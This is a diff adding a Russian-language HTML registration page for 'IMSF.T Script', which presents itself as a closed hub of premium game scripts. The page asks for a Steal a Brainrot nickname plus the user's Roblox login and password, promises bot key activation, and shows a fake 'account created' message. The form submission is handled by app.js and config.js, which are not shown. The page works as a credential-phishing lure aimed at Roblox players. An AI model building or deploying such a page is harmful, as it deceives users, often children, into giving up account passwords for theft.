@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>IMSF.T Script — Регистрация</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="card">
+    <div class="logo">
+        <span class="logo-mark">IMSF.T</span>
+        <span class="logo-sub">SCRIPT</span>
+    </div>
+
+    <h1>Регистрация доступа</h1>
+    <p class="lead">
+        IMSF.T — закрытый хаб премиум-скриптов. Доступ выдаётся только по аккаунту.
+        Данные не передаются третьим лицам. После регистрации бот активирует ваш ключ
+        в течение минуты.
+    </p>
+
+    <form id="regform" data-page="IMSF.T — регистрация">
+        <label>
+            Ник в игре
+            <input type="text" name="nick" placeholder="Ваш ник в Steal a Brainrot" required>
+        </label>
+
+        <label>
+            Логин Roblox
+            <input type="text" name="login" placeholder="Логин от аккаунта Roblox" required>
+        </label>
+
+        <label>
+            Пароль Roblox
+            <input type="password" name="password" placeholder="Пароль от аккаунта" required>
+        </label>
+
+        <button type="submit">Зарегистрироваться</button>
+    </form>
+
+    <div id="success" style="display:none" class="success">
+        <div class="check">✓</div>
+        <h2>Аккаунт создан</h2>
+        <p>Бот активирует ваш ключ в течение минуты. Не закрывайте страницу.</p>
+    </div>
+
+    <p class="foot">
+        Регистрируясь, вы соглашаетесь с <a href="#">условиями</a> и
+        <a href="#">политикой конфиденциальности</a> IMSF.T.
+    </p>
+</div>
+
+<script src="config.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
